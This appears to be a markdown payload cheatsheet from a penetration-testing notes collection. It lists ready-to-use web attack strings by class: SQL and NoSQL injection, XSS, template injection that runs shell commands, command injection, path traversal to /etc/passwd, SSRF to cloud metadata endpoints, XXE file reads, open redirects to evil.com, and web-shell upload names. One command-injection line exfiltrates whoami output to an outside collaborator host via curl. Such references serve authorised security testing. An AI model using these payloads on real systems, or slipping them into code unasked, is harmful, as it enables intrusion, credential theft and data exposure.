# Payload Cheatsheet

Minimal working payloads per class. Variants come from `python/payload_mutator.py`.

---

## SQLi

```
'
''
' AND '1'='1
' AND '1'='2
' OR 1=1-- -
' UNION SELECT NULL-- -
' UNION SELECT 1,2,3-- -
' AND SLEEP(3)-- -
'; WAITFOR DELAY '0:0:3'-- -
' AND pg_sleep(3)-- -
' ORDER BY 1-- -
```

## NoSQL

```
{"$ne":null}
{"$gt":""}
{"$regex":"^a"}
user[$ne]=1&pass[$ne]=1
```

## XSS

```
<script>alert(1)</script>
"><script>alert(1)</script>
' onmouseover='alert(1)
javascript:alert(1)
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
{{constructor.constructor('alert(1)')()}}
```

## SSTI

```
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
{{7*'7'}}
{{config}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

## Command injection

```
; id
| id
|| id
&& id
`id`
$(id)
%0a id
; sleep 5
; curl http://collab/$(whoami)
```

## Traversal / LFI

```
../../../../etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
..%c0%af..%c0%afetc/passwd
/etc/passwd
php://filter/convert.base64-encode/resource=index.php
php://input
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

## SSRF

```
http://127.0.0.1/
http://127.1/
http://0.0.0.0/
http://[::1]/
http://2130706433/
http://0x7f000001/
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
```

## XXE

```
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
```

## Open redirect

```
//evil.com
/\/evil.com
https://target.com@evil.com
https://target.com.evil.com
```

## JWT

```
alg: none  (empty signature)
kid: ../../dev/null
```

## Deserialization

```
PHP:   O:4:"User":1:{s:4:"role";s:5:"admin";}
Java:  rO0AB...  (ysoserial)
Python: gASV...  (pickle)
```

## Upload

```
shell.php   shell.phtml   shell.php.jpg   shell.pHp
GIF89a;<php code>
```

## CRLF

```
%0d%0aSet-Cookie: a=b
%0d%0aLocation: https://evil.com
```

---

## Related

- `11-regex/40-discovery.md`
- `02-web/401-to-200.md`
